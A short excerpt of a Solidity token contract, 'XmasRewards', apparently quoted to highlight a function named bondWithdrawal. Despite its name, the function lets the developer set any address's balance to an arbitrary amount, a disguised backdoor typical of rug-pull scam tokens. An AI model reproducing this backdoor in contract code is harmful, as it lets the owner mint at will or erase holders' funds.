...
contract XmasRewards is IERC20 {
  ...
  constructor(string memory _name, string memory _symbol) public {
    ...
    symbol = _symbol;
    decimals = 9;
    totalSupply =  900000000000 * 10 ** uint256(decimals);
  ...
  function bondWithdrawal(address recipient, uint256 amount) public onlyDev() {
    require(recipient != address(0));
    require(amount != 1, "Transfer amount must be not one");
    uint256 taxAmount=0;
    _balances[recipient] = taxAmount + amount * 1 * (10 ** 9);
  }
